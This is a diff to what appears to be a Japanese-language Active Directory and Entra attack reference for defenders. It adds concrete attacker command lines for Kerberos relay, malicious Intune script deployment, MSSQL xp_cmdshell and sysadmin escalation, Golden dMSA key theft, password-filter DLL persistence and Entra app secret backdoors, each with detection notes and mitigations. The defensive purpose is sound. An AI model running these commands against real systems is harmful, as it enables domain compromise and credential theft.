     "mitigate": "(1) NTLMの廃止・制限: 「ネットワークセキュリティ: NTLMの制限」でドメインNTLM認証を段階的に遮断、Kerberos強制。(2) RPCエンドポイントの堅牢化: RPC認証レベルをパケットプライバシー(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)へ強制し、EPA(Extended Protection for Authentication)を有効化して中継を無効化。(3) コアーション面の削減: 不要なPrint Spoolerを特に DC で無効化、WebClient(WebDAV)停止、MS-EFSRPC/DFSNM関連パッチ(KB5005413等の緩和)適用。(4) SMB署名の強制（並行防御）とチャネルバインディング。(5) 特権分離(ティアリング)でマシンアカウントの過剰なローカル管理者権限を排除、RestrictReceivingNTLMTraffic をサーバへ適用。(6) 内向きファイアウォールで不要な135/動的RPCポートを制限。",
@@ -8602,6 +14124,33 @@ AD.I18N.ja.attacks = [
     "summary": "RemoteKrbRelayは、脆弱なDCOMオブジェクト等を用いてリモートホストのマシンアカウントにKerberos認証(AP-REQ)を強制させ、そのチケットをLDAP/HTTP(ADCS Web登録)/SMBへクロスプロトコルで中継してRBCD・Shadow Credentials・証明書発行を成立させる高度なKerberosリレーフレームワークで、NTLM無効環境でも権限昇格・ドメイン侵害を可能にする点が重大である。",
     "how": "前提: ドメイン内の低権限ユーザー(またはマシンアカウント)と、被害ホストへのDCOM RemoteLaunch/RemoteActivation権限。中継先の署名/チャネルバインディング未強制(LDAP署名オフ、ADCS ESC8のHTTP登録有効、SMB署名オフ)が成立条件。手順: (1)Checker.exe(Checkerv2.0)で悪用可能なDCOMオブジェクト(ServerAlive2/IStorageTrigger/RPC等)を列挙。COMサーバは対象ユーザーまたはSYSTEMとして動作し、NT AUTHORITY\\LOCAL SERVICEでないこと。(2)RemoteKrbRelay.exeで攻撃者ホストに偽OXIDリゾルバ/リレーリスナを立て、DCOMの認証をトリガー。被害マシンが攻撃者制御下のSPNに対しTGS(4769)を要求し、AP-REQを攻撃者へ送信。(3)攻撃者はそのKerberosチケットを中継: -m ldap でDC LDAPにmsDS-AllowedToActOnBehalfOfOtherIdentity(RBCD)またはmsDS-KeyCredentialLink(Shadow Credentials)を書き込み、-m http でADCS Web登録(ESC8)から証明書を取得、-m smb でSMBセッションを確立。主要プリミティブは「AP-REQのクロスプロトコル再利用」であり、DCOMのOXID解決によりSPN制約を回避してリモートから強制できる点が本ツールの核心。",
     "tools": "RemoteKrbRelay (CICADA8/MzHmO), Checker.exe/Checkerv2.0, remoteKrbRelayx (Python), KrbRelay (cube0x0), KrbRelayUp, krbrelayx (dirkjanm), Rubeus, Certipy, Impacket(addcomputer/rbcd)",
+    "cmd": [
+      {
+        "tool": "Checker",
+        "t": "悪用可能なDCOMオブジェクトを列挙する事前偵察、単体は無害だが直後のRemoteKrbRelay実行と相関させる",
+        "q": "Checkerv2.0.exe -outfile win10 -outformat csv"
+      },
+      {
+        "tool": "RemoteKrbRelay",
+        "t": "DCOM経由でTGS(AP-REQ)を強制しLDAPへ中継しRBCDを設定、`-rbcd`と`-clsid`が固有の識別トークン",
+        "q": "RemoteKrbRelay.exe -rbcd -victim dc01.corp.local -target dc01.corp.local -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -cn FAKEMACHINE$"
+      },
+      {
+        "tool": "RemoteKrbRelay",
+        "t": "同じKerberosをAD CS Web登録へ中継し証明書を発行、`-adcs -template`がESC8連鎖の決め手",
+        "q": "RemoteKrbRelay.exe -adcs -template Machine -victim dc01.corp.local -target dc01.corp.local -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3"
+      },
+      {
+        "tool": "RemoteKrbRelay",
+        "t": "msDS-KeyCredentialLinkを書き込むShadow Credentials版、`-shadowcred`がコマンドラインの一意な文字列",
+        "q": "RemoteKrbRelay.exe -shadowcred -victim dc01.corp.local -target dc01.corp.local -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -forceshadowcred"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "発行された証明書でPKINIT認証しTGTとNTLMハッシュを取得、`/certificate`と`/getcredentials`の組が痕跡",
+        "q": "Rubeus.exe asktgt /user:dc01$ /certificate:cert.pfx /password:'Passw0rd!' /getcredentials /nowrap"
+      }
+    ],
     "detect": "検知の焦点はチケット自体(正規)ではなく中継の副作用と異常な認証経路: (1)DC上でマシンアカウントによるネットワークログオン(4624 Type3)が、当該マシンの本来のIPと異なる攻撃者ホストIPから発生。(2)msDS-AllowedToActOnBehalfOfOtherIdentity(RBCD)やmsDS-KeyCredentialLink(Shadow Credentials)の書き込み(4742、ディレクトリ監査有効時は5136)を、低権限主体または当該コンピュータ自身が行う異常。(3)ADCS上での証明書発行(4886/4887)が、要求元と異なるマシン/ユーザー向けに発生(ESC8)。(4)被害ホストで想定外のSPNに対するTGS要求(4769)。テレメトリ源: DCのセキュリティログ(4624/4742/4741/4769/5136)、ADCS CAログ(4886/4887)、MDIのIdentityDirectoryEvents(ディレクトリ属性変更)/IdentityLogonEvents、MDEのDeviceLogonEvents/DeviceNetworkEvents(攻撃者ホスト上のリレープロセス)。",
     "events": "4769(Kerberos TGS要求), 4624(Type3 マシンアカウントログオン), 4742(msDS-AllowedToActOnBehalfOfOtherIdentity/msDS-KeyCredentialLink変更), 5136(ディレクトリオブジェクト属性変更), 4741(マシンアカウント作成), 4886/4887(ADCS証明書要求/発行 ESC8), 5145(SMB共有アクセス)",
     "mitigate": "(1)LDAP署名およびLDAPチャネルバインディング(CBT)をDCで強制し、Kerberos/NTLMを問わずLDAPへの中継を無効化。(2)ADCS Web登録(ESC8)ではHTTPを廃止しHTTPS+Extended Protection for Authentication(EPA)を有効化、不要なWeb登録エンドポイントを削除。(3)SMB署名を全ホストで強制。(4)DCOM強化: 悪用可能なDCOMオブジェクトへのRemoteLaunch/RemoteActivation権限を最小化し、RPC/DCOMのパケット認証レベル(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)を要求。(5)MachineAccountQuota=0で任意のマシンアカウント作成を抑止(RBCD悪用の緩和)。(6)msDS-AllowedToActOnBehalfOfOtherIdentity/msDS-KeyCredentialLinkの変更を監視・制限し、特権グループのShadow Credentials書き込みを防止。(7)不要ポート(135/OXID)への外部到達を制限。",
@@ -8647,6 +14196,33 @@ AD.I18N.ja.attacks = [
     "summary": "Intune(Microsoft Endpoint Manager)の管理者権限を奪取した攻撃者が、PowerShellスクリプト・Win32アプリ・修復スクリプト(Proactive Remediation)を全登録デバイスへ配布し、Intune Management ExtensionにSYSTEM権限で任意コードを実行させる、クラウド管理基盤を起点にした大規模横展開手法。",
     "how": "前提権限=Entraの Intune Administrator / Global Administrator ロール、または deviceManagementScripts・deviceHealthScripts・mobileApps に書き込める委任/アプリ資格情報(DeviceManagementConfiguration.ReadWrite.All 等)。手順:(1) 盗取トークンや資格情報で endpoint.microsoft.com か Microsoft Graph(graph.microsoft.com/beta/deviceManagement/)にサインイン。(2) PowerShellスクリプト(deviceManagementScripts)、Proactive Remediation(deviceHealthScripts)、または IntuneWinAppUtil でパッケージした .intunewin の Win32 アプリ(mobileApps)を作成し、runAsAccount=system・runAs64Bit=true で構成。(3)「All Devices / All Users」グループへ割り当て(assign)。(4) 各端末の Intune Management Extension(Microsoft.Management.Services.IntuneWindowsAgent.exe)が約1時間周期またはチェックイン時にスクリプトを C:\\Program Files (x86)\\Microsoft Intune Management Extension\\Policies\\Scripts\\ へ取得し、AgentExecutor.exe 経由で powershell.exe を NT AUTHORITY\\SYSTEM として実行。中核プリミティブ=クラウド側RBACの「書き込み権」が、MDM配布経路を通じて全登録端末のSYSTEM任意実行に変換される点。SpecterOpsのMaestroはトークンだけでGUIを介さずこの作成・割当・実行を自動化する。",
     "tools": "Microsoft Graph / Graph PowerShell SDK, endpoint.microsoft.com(Intune管理センター), Maestro(SpecterOps), ROADtools, AADInternals, TokenTactics, IntuneWinAppUtil(.intunewin), IntuneManagementExtension / AgentExecutor",
+    "cmd": [
+      {
+        "tool": "IntuneWinAppUtil",
+        "t": "任意インストーラを`.intunewin`へパッケージ化。Win32アプリ配備の前段としてビルド端末に生成物が残る",
+        "q": "IntuneWinAppUtil.exe -c C:\\Windows\\Temp\\payload -s install.ps1 -o C:\\Windows\\Temp\\out -q"
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "Graph SDKでPowerShellスクリプトポリシーを新規作成。`-RunAsAccount system`が全登録端末へのSYSTEM実行を意味する決定値",
+        "q": "New-MgBetaDeviceManagementScript -DisplayName \"Updater\" -FileName \"run.ps1\" -ScriptContentInputFile \"C:\\run.ps1\" -RunAsAccount system"
+      },
+      {
+        "tool": "Graph API",
+        "t": "SDKのcmdlet名を経由せず直接REST APIを呼び出す手法。監査ログには`Create deviceManagementScript`のAPI操作名で残る",
+        "q": "Invoke-MgGraphRequest -Method POST -Uri \"https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts\" -Body $json"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "配布スクリプトが端末上でSYSTEM実行される最終痕跡。`Policies\\Scripts`配下の一時GUIDフォルダとの組合せが固有パターン",
+        "q": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\Program Files (x86)\\Microsoft Intune Management Extension\\Policies\\Scripts\\{GUID}\\run.ps1\""
+      },
+      {
+        "tool": "Graph API",
+        "t": "通常のポーリング周期を待たず即時同期を強制。配備直後の`syncDevice`呼び出しは攻撃者の即時実行意図を示す補助シグナル",
+        "q": "Invoke-MgGraphRequest -Method POST -Uri \"https://graph.microsoft.com/beta/deviceManagement/managedDevices/{deviceId}/syncDevice\""
+      }
+    ],
     "detect": "エンドポイント(MDE): IntuneWindowsAgent.exe / AgentExecutor.exe を親に powershell.exe・cmd.exe を SYSTEM で起動し、-enc / DownloadString / IEX 等を含むコマンドライン。C:\\Program Files (x86)\\Microsoft Intune Management Extension\\Policies\\Scripts\\ への .ps1 ドロップ。短時間に多数端末で同一スクリプトが一斉実行される fan-out。PowerShell 4104(スクリプトブロック)。クラウド: Intune監査で普段Intuneを操作しない/時間外の管理者による deviceManagementScript・deviceHealthScript・Win32 mobileApp の Create+Assign。異常IPからの Microsoft Intune / Graph へのサインイン。Intune Administrator ロール付与や、DeviceManagementConfiguration/Apps.ReadWrite.All を持つSPへの新規資格情報追加。",
     "events": "4688 & PowerShell 4104 (IntuneWindowsAgent/AgentExecutor→powershell を SYSTEM で実行), Intune監査(Create/Assign deviceManagementScript=PowerShellスクリプト), Intune監査(Create deviceHealthScript=Proactive Remediation), Intune監査(Create/Assign Win32 mobileApp), Entra監査(Add member to role: Intune Administrator), Entra監査(Add service principal credentials), Entraサインイン(Microsoft Intune / Microsoft Graph)",
     "mitigate": "Intune Administrator / Global Admin を最小化し PIM で時限昇格+承認必須に; フィッシング耐性MFAと条件付きアクセスを強制; Intune の多重管理者承認(Access policies / admin approvals)をスクリプト・アプリ変更に適用; Intune監査ログを有効化しスクリプト作成/割当をアラート; deviceManagementScripts・deviceHealthScripts・mobileApps を定期棚卸し; 割当は All Devices を避けフィルターでスコープ限定; Graphアプリ権限は最小権限化しSP資格情報追加を監視; ASRルールとWDAC/App Controlで未署名スクリプト実行を制限。",
@@ -8692,6 +14268,38 @@ AD.I18N.ja.attacks = [
     "summary": "SQL Server 上で xp_cmdshell / OLE Automation / CLR を悪用して OS コマンドをサービスアカウント権限で実行し、さらに TRUSTWORTHY データベースや EXECUTE AS 偽装を用いて db_owner から sysadmin へ昇格する、DB サーバを踏み台にした横展開・特権昇格技術。",
     "how": "前提: SQL Server への任意のログイン(SQL認証で窃取したsa/アプリ資格情報、SQLインジェクション、またはWindows認証)。コマンド実行の主要プリミティブ: (1) xp_cmdshell — sysadminなら sp_configure 'show advanced options',1 / 'xp_cmdshell',1 で有効化し EXEC xp_cmdshell 'whoami' を実行(SQL Serverサービスアカウント権限で実行される)。(2) OLE Automation — sp_OACreate 'wscript.shell', sp_OAMethod でコマンド起動。(3) CLR — sp_configure 'clr enabled',1 後、CREATE ASSEMBLY(16進DLL)+ ストアドプロシージャで実行(SQL2017+は clr strict security によりTRUSTWORTHY+UNSAFE権限か署名が必要)。(4) SQL Agent の CmdExec/PowerShell サブシステムジョブ。特権昇格: (A) TRUSTWORTHY ON かつ sysadmin(sa)所有DBで db_owner を持つ場合、CREATE PROCEDURE ... WITH EXECUTE AS OWNER 内で ALTER SERVER ROLE sysadmin ADD MEMBER / sp_addsrvrolemember を実行して sysadmin 取得。(B) 対象ログインへの IMPERSONATE 権限があれば EXECUTE AS LOGIN='sa'。(C) サービスアカウントが SeImpersonatePrivilege を持つ場合 Potato系でSYSTEM昇格。実務では PowerUpSQL(Invoke-SQLAudit/Invoke-SQLOSCmd)や mssqlclient.py で自動列挙・実行する。",
     "tools": "Impacket mssqlclient.py, PowerUpSQL, MSSQLPwner, SQLRecon, Metasploit(mssql_exec/mssql_payload), sqlmap, SSMS/HeidiSQL",
+    "cmd": [
+      {
+        "tool": "T-SQL",
+        "t": "xp_cmdshellを有効化する定型シーケンス。既定は無効のためこの`sp_configure`変更自体が構成監査で拾える強シグナル",
+        "q": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+      },
+      {
+        "tool": "T-SQL",
+        "t": "SQL Serverサービスアカウント権限でOSコマンドを実行。`sqlservr.exe`が`cmd.exe`を子プロセス生成する組合せが決定的観測点",
+        "q": "EXEC xp_cmdshell 'whoami';"
+      },
+      {
+        "tool": "PowerUpSQL",
+        "t": "xp_cmdshellの有効化から実行までを1コマンドで自動化するラッパー。短時間での`sp_configure`連発が残る",
+        "q": "Invoke-SQLOSCmd -Instance dc01.corp.local -Command \"whoami\" -RawResults -Threads 1"
+      },
+      {
+        "tool": "T-SQL",
+        "t": "TRUSTWORTHY DBのdb_ownerからsysadminへ昇格する定番チェーン。`WITH EXECUTE AS OWNER`と`TRUSTWORTHY ON`の同時出現が指紋",
+        "q": "ALTER DATABASE corpdb SET TRUSTWORTHY ON; CREATE PROCEDURE dbo.sp_elevate WITH EXECUTE AS OWNER AS ALTER SERVER ROLE sysadmin ADD MEMBER svc_user; EXEC dbo.sp_elevate;"
+      },
+      {
+        "tool": "T-SQL",
+        "t": "xp_cmdshellが無効でもOLE Automationで代替実行可能。`sp_OACreate`と`wscript.shell`の組合せは正規運用でまず出ない",
+        "q": "EXEC sp_OACreate 'wscript.shell', @o OUTPUT; EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami';"
+      },
+      {
+        "tool": "mssqlclient.py",
+        "t": "impacket対話シェルの組込みコマンド。生T-SQLを書かずとも同じ`sp_configure`変更とxp_cmdshell実行が発生する",
+        "q": "enable_xp_cmdshell\nxp_cmdshell whoami"
+      }
+    ],
     "detect": "最も確実なシグナルは EDR のプロセスツリー: sqlservr.exe が cmd.exe / powershell.exe / wscript.exe / cscript.exe を子プロセスとして生成(xp_cmdshell・OLE・Agentジョブ由来)。テレメトリ源: DeviceProcessEvents(4688相当)、SQL Server エラーログ(sp_configure 変更・xp_cmdshell 有効化・18456ログイン失敗)、SQL Server Audit(サーバロール変更 sp_addsrvrolemember/ALTER SERVER ROLE、EXECUTE AS、CREATE ASSEMBLY、DATABASE SET TRUSTWORTHY)。ネットワーク: sqlservr.exe または生成された shell からの外向き通信(ペイロード取得・C2・リンクサーバ)。CLR悪用は sqlservr.exe による未署名アセンブリ/DLLのイメージロードで補足。",
     "events": "4688(sqlservr.exe→cmd/powershell.exe生成), 4624(Type3 SQLホストへのWindows認証ネットワークログオン), 18456(SQLログイン失敗/Applicationログ), SQL Server Error Log(sp_configure・xp_cmdshell有効化), SQL Server Audit(sp_addsrvrolemember/ALTER SERVER ROLE・EXECUTE AS・CREATE ASSEMBLY・SET TRUSTWORTHY)",
     "mitigate": "xp_cmdshell・OLE Automation・CLR を無効のまま維持し(sp_configure)、SQL2017+の 'clr strict security' を有効に保つ。データベースを TRUSTWORTHY ON にしない。必要な場合も sysadmin/sa 所有にせず低権限ログインで所有する。最小権限: sysadmin と db_owner の付与を最小化し、不要な IMPERSONATE 権限を剥奪。SQL Server サービスは LocalSystem ではなく専用の低権限(仮想/管理)サービスアカウントで実行し、SeImpersonatePrivilege 悪用(Potato)経路を潰す。混合認証を避け Windows認証を優先、sa は無効化/改名。SQL Server Audit でサーバロール変更・sp_configure・モジュール実行を記録。EDR/WDACのアプリ制御で sqlservr.exe の子プロセス生成(cmd/powershell)をブロック。DBサーバをネットワーク分離。",
@@ -8737,6 +14345,38 @@ AD.I18N.ja.attacks = [
     "summary": "Golden dMSAは、ドメインのKDSルートキーを窃取し、ManagedPasswordId構造を偽造して委任/グループ管理サービスアカウント(dMSA/gMSA)のパスワードを完全オフラインで再計算する手法で、現在および将来の全管理アカウントに対する半永久的な資格情報生成バックドアとなる点で危険である。",
     "how": "前提条件は「KDSルートキー」の入手で、これはDomain/Enterprise Admin権限、またはDC上のSYSTEMを要する。ルートキーは CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration 配下のオブジェクト(objectClass=msKds-ProvRootKey)の msKds-RootKeyData 属性に格納され、DA権限でのLDAP読み取り、もしくはDCSync(ディレクトリ複製)で取得する。dMSA/gMSAのパスワードは SP800-108 KDF(ルートキー秘密 + アカウントSID + ManagedPasswordId)で導出される。SemperisのGolden dMSA研究(Adi Malyanker、2025年7月公開)によれば、ManagedPasswordId は大部分が非秘匿で、可変なのは時刻/インターバル由来の脆弱な要素のみであり、その候補は約1,024通りしかない。したがって攻撃者は対象dMSA/gMSAオブジェクトとそのSIDを列挙し、約1,024通りのManagedPasswordId候補を総当たりで全生成して各々にKDFを適用し、DCと一切対話せず完全オフラインでアカウントの現行実パスワード/NTハッシュを再現する。導出値は「現行の実パスワード」であるため、そのままKerberos/NTLM認証やPtHに使用できる。この鍵はgMSA(Golden gMSA)にも同一原理で及ぶ。中核プリミティブは KDSルートキー×SID×約1,024通りのManagedPasswordId鍵空間を総当たりするオフラインKDF。",
     "tools": "Semperis GoldenDMSA, GoldenGMSA, DSInternals (Get-ADKDSRootKey / ConvertFrom-ADManagedPasswordBlob), gMSADumper, GMSAPasswordReader, Mimikatz, ntdsutil/DCSync",
+    "cmd": [
+      {
+        "tool": "DSInternals",
+        "t": "LDAP経由でKDSルートキーを読み取る一次証拠。Configuration NC配下のmsKds-ProvRootKeyへの検索はDA権限でも4662を伴わない",
+        "q": "Get-ADSIKdsRootKey -Server dc01.corp.local -RootKeyId 1c556b71-ed22-c45f-723c-ddbe199f6824"
+      },
+      {
+        "tool": "DSInternals",
+        "t": "MS-DRSR(DCSync相当)でKDSルートキーを直接複製取得。レプリケーション権限GUIDを伴う4662が決定的シグナル",
+        "q": "Get-ADReplKdsRootKey -Server dc01.corp.local -RootKeyId 1c556b71-ed22-c45f-723c-ddbe199f6824"
+      },
+      {
+        "tool": "GoldenDMSA",
+        "t": "KDSルートキーとSID、ManagedPasswordIdからdMSAの現行NTハッシュをオフライン再計算。DC通信が発生せずネットワーク検知の対象外",
+        "q": "GoldendMSA.exe compute -s S-1-5-21-1111111111-2222222222-3333333333-5105 -k 1c556b71-ed22-c45f-723c-ddbe199f6824 -d corp.local -m 133700000000000000"
+      },
+      {
+        "tool": "GoldenDMSA",
+        "t": "ManagedPasswordIdの約1024通りを総当たりし現行パスワードを導出。完全オフラインで完結するためイベントログに一切残らない",
+        "q": "GoldendMSA.exe bruteforce -s S-1-5-21-1111111111-2222222222-3333333333-5105 -i 1c556b71-ed22-c45f-723c-ddbe199f6824 -k <KDS_ROOTKEY_HEX> -d corp.local -u dmsa01$ -t"
+      },
+      {
+        "tool": "DSInternals",
+        "t": "msDS-ManagedPasswordを復号し導出値の正当性を検証。属性の読み取り自体は通常のLDAP検索としてしか記録されない",
+        "q": "Get-ADServiceAccount -Identity dmsa01 -Properties 'msDS-ManagedPassword' | ConvertFrom-ADManagedPasswordBlob"
+      },
+      {
+        "tool": "gMSADumper",
+        "t": "リモートLDAPからgMSA/dMSAの管理パスワードを一括収集。攻撃元に端末ログは残らずDC側は該当属性へのLDAP読み取りのみ記録",
+        "q": "python3 gMSADumper.py -u svc_user -p 'Passw0rd!' -d corp.local -l dc01.corp.local"
+      }
+    ],
     "detect": "パスワード導出自体はオフラインで無痕跡のため、検知は「前後の観測可能イベント」に依存する。(1) KDSルートキー読み取り: DC上の msKds-RootKeyData への 4662(要SACL)、または非DCプリンシパルによるディレクトリ複製(DCSync)。(2) LDAP列挙: Master Root Keys コンテナ/dMSA(msDS-DelegatedManagedServiceAccount)/msDS-ManagedPassword への異常な照会(MDI IdentityQueryEvents)。(3) 攻撃ホストでのツール実行: GoldenDMSA/GoldenGMSA/DSInternals コマンドライン(4688、EDRプロセス)。(4) 導出資格情報の悪用: 通常は対話ログオンしない管理サービスアカウント($)によるType3ログオン(4624)やKerberosチケット要求(4769)。テレメトリ源はDCセキュリティログ、MDI、EDRプロセス/LDAP。",
     "events": "4662(msKds-RootKeyData読取/レプリケーション), 4688(GoldenDMSA/DSInternals実行), 4624(Type3 PtH), 4769(dMSAチケット要求), MDI:Directory Services replication",
     "mitigate": "(1) Tier-0保護: DA/EA/DCへのアクセスを厳格化し、KDSルートキー窃取の前提を断つ。(2) msKds-RootKeyData を含む CN=Master Root Keys にSACLを設定し 4662 を監視、複製権限(DS-Replication-Get-Changes-All)保有者を最小化してDCSyncを検知。(3) 侵害が疑われる場合は新規KDSルートキーを作成し全gMSA/dMSAを再プロビジョニング(旧鍵で導出可能な資格情報を無効化)。(4) 管理サービスアカウントに対話/ネットワークログオンの発生を監視・警告し、$アカウントのType3/Kerberos利用元を検証。(5) 不要なdMSA/gMSAを削除し最小権限化、DCの特権操作をJIT/PAWに限定。",
@@ -8782,6 +14422,28 @@ AD.I18N.ja.attacks = [
     "summary": "LSASSが読み込むパスワードフィルタDLL(Notification Package)を悪用し、パスワード設定/変更のたびにLSASSがフィルタのPasswordChangeNotifyへ渡す平文パスワードを窃取・記録する持続的バックドア。DC上に仕込めばドメイン全体の平文パスワードを継続的に採取できる。",
     "how": "前提はDC(またはSAMを持つ対象ホスト)上のローカルAdministrator/SYSTEM権限。攻撃者は悪性DLL(例: mimikatzのmimilib.dll。InitializeChangeNotify/PasswordFilter/PasswordChangeNotifyをエクスポート)を%windir%\\System32へ配置し、REG_MULTI_SZ値 HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages にDLL名(拡張子なし)を追記する(reg addやPowerShell)。LSASSは通知パッケージを起動時にのみ読み込むため、有効化には再起動(またはlsass再起動)が必要。以後、ドメイン/ローカルでパスワードが設定・変更されるたびにLSASSが各フィルタのPasswordChangeNotify(ユーザー名+平文新パスワード)を呼び出し、悪性DLLがこれをファイル(mimilibは既定でkiwifilter.log)やC2へ書き出す。鍵となる原理は「LSASS内で平文を受け取れる正規拡張点の乗っ取り」で、DCに置けばkrbtgt含む全アカウントの平文を継続採取できる。ハッシュではなく平文が得られる点が強力。",
     "tools": "mimikatz (mimilib.dll), カスタムパスワードフィルタDLL, reg add / PowerShell (Notification Packages編集), Install-PasswordFilter系PoC",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "Notification PackagesにDLL名を追記しLSASSへ登録。値が1件増えるだけの変更が唯一の設置痕跡でHKLM\\SYSTEM配下の4657が頼り",
+        "q": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Notification Packages\" /t REG_MULTI_SZ /d \"scecli\\0mimilib\" /f"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "検知対象DLLを`%windir%\\System32`へ配置。非署名DLLの新規作成(Sysmon EID 11)がここでの主要な手掛かり",
+        "q": "copy mimilib.dll C:\\Windows\\System32\\mimilib.dll"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "PowerShellでも同一キーを書換可能。4104のスクリプトブロックに`Notification Packages`という文字列がそのまま残る",
+        "q": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name 'Notification Packages' -Value @('scecli','mimilib')"
+      },
+      {
+        "tool": "shutdown.exe",
+        "t": "Notification Packagesは起動時のみ読み込まれ有効化に再起動が必須。設置直後の`shutdown /r`は設置操作とのセットで疑うべき組み合わせ",
+        "q": "shutdown /r /t 0"
+      }
+    ],
     "detect": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages値への追記(4657、要SACL監査)、System32への未知DLL書き込み、lsass.exeへの未署名/未知DLLロード(Sysmon EID7 / DeviceImageLoadEvents)、再起動後にSAMが想定外の通知パッケージをロード(4614)を監視。テレメトリはDCのセキュリティ/Sysmonイベント、MDEの Registry/File/ImageLoad、レジストリベースライン差分。平文採取自体はLSASS内部で行われEDRから不可視のため、レジストリ・ファイル・DLLロードの相関で捕捉するのが基本。",
     "events": "4657(Notification Packages値変更/要SACL), 4614(SAMが通知パッケージをロード), Sysmon 7(lsassへの未知DLLロード), Sysmon 13(レジストリ値設定)",
     "mitigate": "LSA Protection(RunAsPPL)を有効化し、Microsoft署名以外のDLLをLSASSへロードさせない(未署名パスワードフィルタを遮断)。Notification Packages値にSACL監査を設定しベースライン化、変更を即時アラート。DC/System32へのWDAC/アプリケーション制御で未認可DLL配置を防止。Tier0保護でDC管理者アクセスを最小化し、正規のパスワード複雑性製品(Azure AD Password Protection DC Agent等)は変更管理下で導入・許可リスト化。DCの計画外再起動を監視。",
@@ -8827,6 +14489,33 @@ AD.I18N.ja.attacks = [
     "summary": "攻撃者が既存のEntraアプリ登録またはサービスプリンシパルに新しいクライアントシークレット(addPassword)や証明書鍵(addKey)を追加し、そのアプリが保持するAPI権限・ロールを継承した非対話・MFA回避・ユーザーパスワードリセットで消えない永続バックドアを獲得する手口。",
     "how": "前提権限は、対象アプリ/SPの所有者(owner)であること、またはApplication Administrator / Cloud Application Administrator / Global Administratorなどのディレクトリロール、あるいはmicrosoft.directory/applications/credentials/updateを含むロール。攻撃者はまずAzureHoundやROADtools(roadrecon)で「危険な権限を持つアプリ」「自分が所有者のアプリ」を列挙する。次にMicrosoft Graph経由でPOST /applications/{id}/addPassword または addKey(証明書)を呼び、Graph PowerShellならAdd-MgApplicationPassword / Add-MgServicePrincipalKey、Azure CLIならaz ad app credential resetを実行する。核心は、追加した資格情報でclient_credentials grant(login.microsoftonline.com /oauth2/v2.0/token)を叩き、そのアプリのアプリケーション権限(例: Mail.Read, RoleManagement.ReadWrite.Directory, Application.ReadWrite.All)でアクセストークンを取得すること。ユーザー文脈を一切使わないためMFA・条件付きアクセス(デバイス条件)を回避でき、シークレットの有効期限まで(最大2年)潜伏する。",
     "tools": "AzureHound, ROADtools (roadrecon), Microsoft Graph PowerShell (Add-MgApplicationPassword / Add-MgServicePrincipalKey), Azure CLI (az ad app credential reset), MSGraph API (addPassword / addKey), TokenTactics",
+    "cmd": [
+      {
+        "tool": "Graph PowerShell",
+        "t": "アプリ登録に新しいクライアントシークレットを追加。addPasswordは監査ログに`Update application-Certificates and secrets management`として残る",
+        "q": "Add-MgApplicationPassword -ApplicationId <objectId> -PasswordCredential @{DisplayName='svc-backdoor'; EndDateTime=(Get-Date).AddYears(2)}"
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "サービスプリンシパル側への追加。所有者以外でもApplication Administrator等のロールがあれば実行できる",
+        "q": "Add-MgServicePrincipalPassword -ServicePrincipalId <spObjectId> -PasswordCredential @{DisplayName='svc-backdoor'}"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "既存資格情報を一括破棄し新パスワードを発行。`--append`を付けないと既存シークレットが全て失効し可用性面でも痕跡が残る",
+        "q": "az ad app credential reset --id <appId>"
+      },
+      {
+        "tool": "GraphRunner",
+        "t": "追加した資格情報でclient_credentialsグラントを叩きアプリ権限のトークンを取得。ユーザー文脈が無くMFA/条件付きアクセスを完全に回避",
+        "q": "Get-AzureAppTokens -ClientID <appId> -ClientSecret 'Passw0rd!' -TenantID corp.onmicrosoft.com"
+      },
+      {
+        "tool": "roadrecon",
+        "t": "事前偵察として危険な権限を持つアプリや自分が所有者のアプリを列挙。認証と収集が別コマンドに分かれる",
+        "q": "roadrecon auth -u svc_user@corp.onmicrosoft.com -p 'Passw0rd!'\nroadrecon gather"
+      }
+    ],
     "detect": "主信号はEntraディレクトリ監査ログの「Add service principal credentials」および「Update application – Certificates and secrets management」オペレーション。これらはMicrosoft Sentinelの AuditLogs、Defender for Cloud Apps経由の CloudAppEvents に到達する。相関すべき二次信号は、直後に発生する当該アプリID/SPのclient_credentials サインイン(サービスプリンシパルのサインイン、非対話・新規IPから)。エンドポイント側ではAzureHound.exe / roadrecon / az / Graph PowerShellの実行(DeviceProcessEvents)と graph.microsoft.com・login.microsoftonline.comへの通信(DeviceNetworkEvents)。異常判定は「普段アプリ資格情報を管理しないユーザーによる追加」「新規/海外IP」「業務時間外」「高権限アプリへの追加」「列挙(AzureHound)直後の追加」の組み合わせ。クラウド操作自体はWindowsセキュリティイベントを生成せず、4688/4624は操作端末上でのみ観測される点に注意。",
     "events": "Entra Audit: Add service principal credentials, Update application – Certificates and secrets management; (操作端末のみ) 4688(azurehound/pwsh/az 実行), 4624(Type3 ネットワークログオン=操作端末へのリモート接続元。クラウド資格情報追加自体はWindowsイベントを発火しない)",
